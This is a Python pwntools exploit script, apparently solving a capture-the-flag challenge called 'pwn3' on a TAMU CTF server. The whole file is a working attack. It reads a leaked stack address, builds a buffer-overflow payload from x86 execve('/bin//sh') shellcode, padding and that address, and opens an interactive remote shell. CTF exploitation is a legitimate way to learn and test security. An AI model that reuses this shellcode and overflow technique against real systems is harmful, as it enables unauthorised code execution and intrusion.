#!/usr/bin/env python2
#encoding: utf-8

from pwn import *

#context.log_level = 'debug'

binary = './pwn3'

io = remote('pwn.ctf.tamu.edu', 4323)
#io = process(binary)

#gdb.attach(io, '''
#	b echo
#''')

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"


io.recvuntil('Your random number ')
data = io.recvuntil('!\n', drop = True)
ret = int(data, 16)
payload = shellcode + 'a'*(0xf2-len(shellcode)) + pack(ret)
io.recvuntil('Now what should I echo? ')
io.sendline(payload)

io.interactive()




